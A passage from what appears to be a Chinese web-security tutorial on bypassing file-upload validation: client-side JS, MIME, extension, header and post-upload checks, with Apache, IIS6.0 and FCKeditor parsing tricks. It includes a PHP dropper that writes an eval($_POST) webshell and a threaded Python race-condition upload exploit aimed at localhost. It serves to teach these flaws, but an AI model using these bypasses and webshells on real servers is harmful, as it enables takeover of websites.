            <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//alert(ext_name);</span>
            <span class="token comment" spellcheck="true">//alert(ext_name + "|");</span>
            <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span>     ext_name<span class="token punctuation">;</span>
                <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span>h3<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>
<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">""</span> method<span class="token operator">=</span><span class="token string">"post"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span> name<span class="token operator">=</span><span class="token string">"upload"</span> onsubmit<span class="token operator">=</span><span class="token string">"return     checkFile()"</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"MAX_FILE_SIZE"</span> value<span class="token operator">=</span><span class="token string">"204800"</span><span class="token operator">/</span><span class="token operator">></span>
    请选择要上传的文件：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token operator">/</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"上传"</span><span class="token operator">/</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre>
<p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p>
<h5 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h5><p>1.通过firefox的F12修改js代码绕过验证 2.使用burp抓包直接提交，绕过js验证</p>
<h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><h5 id="文件头content-type字段校验（服务端MIME类型检测）"><a href="#文件头content-type字段校验（服务端MIME类型检测）" class="headerlink" title="文件头content-type字段校验（服务端MIME类型检测）"></a>文件头content-type字段校验（服务端MIME类型检测）</h5><h5 id="MIME类型介绍"><a href="#MIME类型介绍" class="headerlink" title="MIME类型介绍"></a>MIME类型介绍</h5><p><strong>MIME type</strong>的缩写为<strong>(Multipurpose Internet Mail Extensions)</strong>代表互联网媒体类型(Internet media type)，MIME使用一个简单的字符串组成，最初是为了标识邮件Email附件的类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。</p>
<p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。</p>
<p>Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p>
<h6 id="MIME类型格式："><a href="#MIME类型格式：" class="headerlink" title="MIME类型格式："></a>MIME类型格式：</h6><p>类别/子类别;参数 Content-Type: [type]/[subtype]; parameter</p>
<h6 id="MIME主类别："><a href="#MIME主类别：" class="headerlink" title="MIME主类别："></a>MIME主类别：</h6><p>text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；</p>
<p>Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</p>
<p>Application：用于传输应用程序数据或者二进制数据；</p>
<p>Message：用于包装一个E-mail消息；</p>
<p>Image：用于传输静态图片数据；</p>
<p>Audio：用于传输音频或者音声数据；</p>
<p>Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</p>
<h6 id="常见MIME类型："><a href="#常见MIME类型：" class="headerlink" title="常见MIME类型："></a>常见MIME类型：</h6><p><img src="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s" alt="img"></p>
<h5 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//检测content-type</span>
    <span class="token keyword">echo</span> <span class="token string">"sorry,we only allow uploading GIF images"</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Upload success!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p>
<h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p>
<h4 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h4><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//判断上传文件类型</span>
<span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token function">fileext</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fileext</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"upload success!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"sorry"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>默认上传后的文件保存的名字是已获取到的名字</p>
<h5 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h5><h6 id="配合Apache的-htaccess文件上传解析漏洞"><a href="#配合Apache的-htaccess文件上传解析漏洞" class="headerlink" title="配合Apache的.htaccess文件上传解析漏洞"></a>配合Apache的.htaccess文件上传解析漏洞</h6><blockquote>
<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p>
</blockquote>
<p>有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。</p>
<p>首先我们编写一个.htaccess文件。打开记事本，编写代码“AddType application/x-httpd-php .jpg”，然后点击文件选中另存为，编写文件名为.htaccess，选择保存类型为所有文件。然后将其进行上传。因为.htaccess是apache服务器中的一个配置文件,不在上传的文件的黑名单之内,所以.htaccess文件是可以上传成功。</p>
<p>接下来我们制造一个一句话木马文件，如取名为yijuhua.php。因为之前上传成功到服务器的.htaccess文件里的代码可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们把yijuhua.php文件的后缀名改为.jpg格式,让.htaccess文件解析yijuhua.jpg文件里的php代码，从而使木马上传成功并达到可执行的目的。</p>
<h6 id="Apache站上的解析缺陷绕过上传漏洞"><a href="#Apache站上的解析缺陷绕过上传漏洞" class="headerlink" title="Apache站上的解析缺陷绕过上传漏洞"></a>Apache站上的解析缺陷绕过上传漏洞</h6><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，整个漏洞的关键就是Apache的合法后缀到底是哪些，不是合法后缀的都可以被利用，所以将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。</p>
<p>例如新建完要上传的一句话木马文件后命名为yijuhua.php，然后我们在文件后缀处添加上7z，就有可能绕过验证上传成功。也可以修改后缀名为cab、zip、bmp等，只要是允许的上传类型都可能被上传成功。最后通过菜刀类工具访问即可。</p>
<h6 id="IIS6-0站上的目录路径检测解析绕过上传漏洞"><a href="#IIS6-0站上的目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0站上的目录路径检测解析绕过上传漏洞"></a>IIS6.0站上的目录路径检测解析绕过上传漏洞</h6><p>当我们使用的服务器都是Windows2003，并且使用的服务为IIS6.0时，就可能存在如本节所描述的漏洞。</p>
<p>以asp为例，先准备好一句话木马文件，然后通过burpsuite进行抓包：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s" alt="img"></p>
<p>查看数据包：</p>
<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 uploadimg/改为<code>uploadimg/1.asp/;</code>，<code>filename=&quot;yijuhua.asp&quot;</code>修改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>。如图：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s" alt="img"></p>
<p>本例的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“yijuhua.asp/1.jpg”</code>，也同样会被IIS当作ASP文件来解析并执行。</p>
<p>首先我们请求<code>/yijuhua.asp/1.jpg</code>，服务器会从头部查找查找”.”号,获得.asp/1.jpg。然后查找”/“,如果有则内存截断，所以<code>/yijuhua.asp/1.jpg</code>会当做<code>/yijuhua.asp</code>进行解析。</p>
<p>上传成功后，通过response我们可以查看到得到的文件名信息为“1.asp;14127900008.asp”，那么就可以在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.asp;14127900008.asp”</code>，并通过菜刀类的工具进行访问了。</p>
<h6 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h6><p>此类方法与上面讲的目录解析有点类似，不同点在于是利用文件解析来达到绕过上传的目的。</p>
<p>以php为例，同样是准备好一句话木马文件后通过burpsuite进行抓包。</p>
<p>查看数据包：</p>
<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 <code>uploadimg/</code> 改为 <code>uploadimg/1.php;</code> ，<code>filename=&quot;yijuhua.php&quot;</code>修改为<code>filename=&quot;yijuhua.jpg&quot;</code>。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s" alt="img"></p>
<p>本例中的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“1.php;yijuhua.jpg”</code>，也同样会被IIS当作PHP文件来解析并执行</p>
<p>首先我们请求<code>/1.php;yijuhua.jpg</code>，然后服务器会从头部查找查找”.”号,获得<code>.php;yijuhua.jpg</code>。接着查找到”;”，有则内存截断，所以<code>/1.php;yijuhua.jpg</code>会当做/1.php进行解析。</p>
<p>最后类似上一节那样，通过response我们可以查看到得到的文件名信息为<code>“1.php;14127900008.php”</code>，在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.php;14127900008.php”</code>，并通过菜刀类的工具进行访问。</p>
<p>1.使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</p>
<p>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等(IIS默认支持解析.asp,.cdx, .asa,.cer等)</p>
<p>能被解析的文件扩展名列表：</p>
<pre><code>   jsp jspx jspf
   asp asa cer aspx</code></pre><p>3.配合操作系统文件命令规则</p>
<p>（1）上传不符合windows文件命名规则的文件名</p>
<pre><code>   　　test.asp.
   　　test.asp(空格)
   　　test.php:1.jpg
   　　test.php:: $DATA</code></pre><p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
<p>（2）linux下后缀名大小写</p>
<p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<p>(3)借助系统特性突破扩展名验证，如：test.php_(在windows下,下划线是空格，保存文件时下划线被吃掉剩下test.php)</p>
<p>4.双扩展名之间使用00截断，绕过验证上传恶意代码</p>
<p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
<pre><code>   　　test.php(0x00).jpg
   　　test.php%00.jpg
   　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</code></pre><p>5.超长文件名截断上传(windows 258byte | linux 4096byte)</p>
<h4 id="服务端检测文件内容"><a href="#服务端检测文件内容" class="headerlink" title="服务端检测文件内容"></a>服务端检测文件内容</h4><h5 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h5><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
<p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
<p>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</p>
<p>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?></p>
<p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#PHP    </span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token string">"上传的txt文件路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> 
<span class="token shell-comment comment">#ASP    </span>
<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#include file="上传的txt文件路径" --></span></span>
<span class="token shell-comment comment">#JSP    </span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">jsp:</span>inclde</span> <span class="token attr-name">page</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传的txt文件路径<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
<span class="token keyword">or</span>  
<span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">%</span>@<span class="token keyword">include</span> file<span class="token operator">=</span><span class="token string">"上传的txt文件路径"</span><span class="token operator">%</span><span class="token operator">></span></code></pre>
<p>详细参考：<a href="http://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p>
<h5 id="利用PHP特性（使用数组绕过）"><a href="#利用PHP特性（使用数组绕过）" class="headerlink" title="利用PHP特性（使用数组绕过）"></a>利用PHP特性（使用数组绕过）</h5><p><img src="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s" alt="img"></p>
<p>file_put_contents 这个函数的第二个参数 可以是数组</p>
<p>然后 如果代码里用正则匹配 bad word 的时候</p>
<p>对一个数组进行正则匹配没用</p>
<h4 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h4><h5 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h5><p>不同的图片文件都有不同文件头，如：</p>
<p>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A</p>
<p>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</p>
<p>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61</p>
<p>PHP使用getimagesize函数验证图片文件头</p>
<h5 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了</p>
<p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
<pre class=" language-php"><code class="language-php">GIF89a
<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<h4 id="上传到服务端后验证"><a href="#上传到服务端后验证" class="headerlink" title="上传到服务端后验证"></a>上传到服务端后验证</h4><h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>演示代码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span>

<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"file upload success.file path is: "</span><span class="token punctuation">.</span><span class="token variable">$newfile</span><span class="token punctuation">.</span><span class="token string">"\n&lt;br />"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:upload the file type is not allowed，delete the file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./info.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php @eval($_POST["drops"]) ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<p>​    当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> threading

<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/shell0.php"</span>
        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/copy.php"</span>

    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>
        file <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>open<span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span>file<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    threads <span class="token operator">=</span> <span class="token number">20</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>经过几次尝试后成功成功写入shell</p>
<p><img src="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s" alt="img"></p>
<h4 id="针对各种CMS"><a href="#针对各种CMS" class="headerlink" title="针对各种CMS"></a>针对各种CMS</h4><p>比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</p>
<ul>
<li>PHPCMSv9.6.0任意文件上传</li>
</ul>
<h5 id="针对各种编辑器漏洞"><a href="#针对各种编辑器漏洞" class="headerlink" title="针对各种编辑器漏洞"></a>针对各种编辑器漏洞</h5><p>比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</p>
<h5 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h5><p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。</p>
<h5 id="1-FCKeditor"><a href="#1-FCKeditor" class="headerlink" title="1 FCKeditor"></a>1 FCKeditor</h5><p>下面以FCKeditor(现名为CKEditor)为例：</p>
<pre><code>1、敏感信息暴漏
    * 查看版本信息
        /FCKeditor/editor/dialog/fck_about.html
    * 默认上传页面
        /FCKeditor/editor/filemanager/browser/default/browser.html
        /FCKeditor/editor/filemanager/browser/default/connectors/test.html
        /FCKeditor/editor/filemanager/upload/test.html
        /FCKeditor/editor/filemanager/connectors/test.html
        /FCKeditor/editor/filemanager/connectors/uploadtest.html
    * 其他敏感文件
        /FCKeditor/editor/filemanager/connectors/aspx/connector.html
        /FCKeditor/editor/filemanager/connectors/asp/connector.html
        /FCKeditor/editor/filemanager/connectors/php/connector.php
2、黑名单策略错误
    FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名
3、任意文件上传漏洞
    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，
